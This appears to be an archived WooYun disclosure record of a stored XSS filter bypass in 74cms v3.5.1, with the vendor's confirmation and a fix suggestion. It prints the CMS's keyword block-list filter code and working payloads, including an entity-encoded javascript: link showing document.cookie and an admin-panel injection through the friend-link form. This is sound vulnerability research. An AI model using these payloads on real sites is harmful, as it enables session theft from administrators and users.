{"id": 47493, "wybug_id": "wooyun-2014-080646", "wybug_title": "骑士CMS全局XSS过滤绕过存储型XSS前台后台指哪打哪", "wybug_corp": "74c,s.com", "wybug_author": "龟兔赛跑", "wybug_date": "2014-10-25 14:08", "wybug_open_date": "2015-01-23 14:10", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-23：\t细节向公众公开  简要描述： 74cms_v3.5.1_20141020骑士CMS全局XSS过滤绕过存储型XSS前台后台指哪打哪(大部分能输入的地方都可以)。 详细说明：  开篇：php里面的strip_tags()函数剥去 HTML、XML 以及 PHP 的标签。但是并不是所有的<XXX>都会被过滤。例如：\n<%0Ba%0b>(注释：%0b表示字符0x0B, 即为urldecode('%3C%0Ba%0B%3E')的值)\n上面的代码经过strip_tags()后，返回字符串不过会改变。本次然过就是基于以上内容+全局过滤函数的一些BUG。分析：我们先来看看全局的XSS过滤函数。\nfunction mystrip_tags($string){\t$string = new_html_special_chars($string);\t$string = remove_xss($string);\treturn $string;}function new_html_special_chars($string) {\t$string = str_replace(array('&amp;', '&quot;', '&lt;', '&gt;'), array('&', '\"', '<', '>'), $string);\t$string = strip_tags($string);\treturn $string;}function remove_xss($string) {     $string = preg_replace('/[\\x00-\\x08\\x0B\\x0C\\x0E-\\x1F\\x7F]+/S', '', $string);    $parm1 = Array('javascript', 'union','vbscript', 'expression', 'applet', 'xml', 'blink', 'link', 'script', 'embed', 'object', 'iframe', 'frame', 'frameset', 'ilayer', 'layer', 'bgsound', 'title', 'base');    $parm2 = Array('onabort', 'onactivate', 'onafterprint', 'onafterupdate', 'onbeforeactivate', 'onbeforecopy', 'onbeforecut', 'onbeforedeactivate', 'onbeforeeditfocus', 'onbeforepaste', 'onbeforeprint', 'onbeforeunload', 'onbeforeupdate', 'onblur', 'onbounce', 'oncellchange', 'onchange', 'onclick', 'oncontextmenu', 'oncontrolselect', 'oncopy', 'oncut', 'ondataavailable', 'ondatasetchanged', 'ondatasetcomplete', 'ondblclick', 'ondeactivate', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'onerror', 'onerrorupdate', 'onfilterchange', 'onfinish', 'onfocus', 'onfocusin', 'onfocusout', 'onhelp', 'onkeydown', 'onkeypress', 'onkeyup', 'onlayoutcomplete', 'onload', 'onlosecapture', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onmove', 'onmoveend', 'onmovestart', 'onpaste', 'onpropertychange', 'onreadystatechange', 'onreset', 'onresize', 'onresizeend', 'onresizestart', 'onrowenter', 'onrowexit', 'onrowsdelete', 'onrowsinserted', 'onscroll', 'onselect', 'onselectionchange', 'onselectstart', 'onstart', 'onstop', 'onsubmit', 'onunload','style');\t\t$parm3 = Array('alert','sleep','load_file','confirm','prompt','benchmark','select','update','insert','delete','alter','drop','truncate');    $parm = array_merge($parm1, $parm2, $parm3); \tfor ($i = 0; $i < sizeof($parm); $i++) { \t\t$pattern = '/'; \t\tfor ($j = 0; $j < strlen($parm[$i]); $j++) { \t\t\tif ($j > 0) { \t\t\t\t$pattern .= '('; \t\t\t\t$pattern .= '(&#[x|X]0([9][a][b]);?)?'; \t\t\t\t$pattern .= '|(&#0([9][10][13]);?)?'; \t\t\t\t$pattern .= ')?'; \t\t\t}\t\t\t$pattern .= $parm[$i][$j]; \t\t}\t\t$pattern .= '/i';\t\t$string = preg_replace($pattern, '****', $string); \t}\treturn $string;}\nmystrip_tags()函数的两部分new_html_special_chars()和remove_xss()，new_html_special_chars()主要是使用strip_tags()过滤HTML标签，remove_xss()则用于过滤一些html属性中的一些关键字。在remove_xss()函数中先删除一些特殊字符:$string = preg_replace('/[\\x00-\\x08\\x0B\\x0C\\x0E-\\x1F\\x7F]+/S', '', $string);    ******** BUG 1这里就留下了注入html entry的机会，例如前面说的<%0Ba%0b>，经过new_html_special_chars()后还是<%0Ba%0b>，但是经过remove_xss()后就变成了<a>.继续看下面的代码，href属性没有过滤，我门就用他吧。也许代码的作者会觉得javascript被过滤了，能注入href也没用吧。不过我们继续看第二处BUG：\n$pattern = '/'; \t\tfor ($j = 0; $j < strlen($parm[$i]); $j++) { \t\t\tif ($j > 0) { \t\t\t\t$pattern .= '('; \t\t\t\t$pattern .= '(&#[x|X]0([9][a][b]);?)?'; \t\t\t\t$pattern .= '|(&#0([9][10][13]);?)?'; \t\t\t\t$pattern .= ')?'; \t\t\t}\t\t\t$pattern .= $parm[$i][$j]; \t\t}\t\t$pattern .= '/i';\n如上代码中javascript将被转换成:\n((&#[x|X]0([9][a][b]);?|(&#0([9][10][13]);?)?)?)j((&#[x|X]0([9][a][b]);?|(&#0([9][10][13]);?)?)?)a((&#[x|X]0([9][a][b]);?|(&#0([9][10][13]);?)?)?)v((&#[x|X]0([9][a][b]);?|(&#0([9][10][13]);?)?)?)a((&#[x|X]0([9][a][b]);?|(&#0([9][10][13]);?)?)?)s((&#[x|X]0([9][a][b]);?|(&#0([9][10][13]);?)?)?)c((&#[x|X]0([9][a][b]);?|(&#0([9][10][13]);?)?)?)r((&#[x|X]0([9][a][b]);?|(&#0([9][10][13]);?)?)?)i((&#[x|X]0([9][a][b]);?|(&#0([9][10][13]);?)?)?)p((&#[x|X]0([9][a][b]);?|(&#0([9][10][13]);?)?)?)t\n以上正则表达是对下面的代码是无效的：（程序员们，你们的代码没有测试过吧）\nja&#118;asc&#114;ipt\n错误的过滤了下面的代码吧（没测试，看起来像）：\nja&#118;vasc&#114;ript\n根据以上分析，我们已经能注入一些HTML实体<a href=ja&#118;asc&#114;ipt:XXXX><img>了.OK了，进入实战。结下来我们会构建一个通用代码，一个图片链接，点击图片链接的时候会弹出框显示document.cookie.\n<a href=ja&#118;asc&#114;ipt:ale&#114t(document.cookie)><img src=XXXX.png></a>\n注入的代码就是：\n<%0Ba%0B href=ja&#118;asc&#114;ipt:ale&#114t(document.cookie)%0B><%0Bimg%0B src=XXXX.png%0B><%0B/a%0B>\n好了，我们利用骑士忽略的漏洞来打个后台： WooYun: 骑士CMS存储型XSS（攻击管理员） 我们先通过营业执照认证功能来上传一张图片，以很明显的方式同时管理员点击图片升级等等等，长传的图片为：\n\n等到图片的地址，然后去申请友情链接，里面的内容随便填，\n\n开启burp，然后设置burp为代理，提交：\n\n修改payload的内容，将其中的link_url改为：\nhttp%3A%2F%2Fwww.test.com%22%3E%3C%0Ba%0B+class=\"admin_%26%23102%3Brameset\"+href%3Dja%26%23118%3Basc%26%23114%3Bipt%3Aale%26%23114t%28document.cookie%29%0B%3E%3C%0Bimg%0B+src%3D%2F74cms%2Fdata%2Fcertificate%2F2014%2F10%2F24%2F1414127426199.png%0B%3E%3C%0B%2Fa%0B%3E%3C%0Bb+a%3D%22\n\n\nGo。登录后台，在广告->友情链接,即可看到如下画面：\n\n点击升级图片的任何地方，即弹出cookie.\n\n同样的方法注入HTML到投诉与建议打后台：\n\n前台示例1：（招聘岗位）\nhttp://demo.74cms.com/jobs/jobs-show.php?id=24\n\n\n前台示例2： （查看简历）\nhttp://demo.74cms.com/resume/resume-show.php?id=43\n\n\n   漏洞证明：  \n\n\n\n\nhttp://demo.74cms.com/jobs/jobs-show.php?id=24\n\n\n\nhttp://demo.74cms.com/resume/resume-show.php?id=43\n\n\n   修复方案：  $string = preg_replace('/[\\x00-\\x08\\x0B\\x0C\\x0E-\\x1F\\x7F]+/S', '', $string);这个应该在最前面做吧，好又过滤javascript的那的代码也的改改。   版权声明：转载请注明来源 龟兔赛跑@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-10-25 18:59 厂商回复： 感谢反馈！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}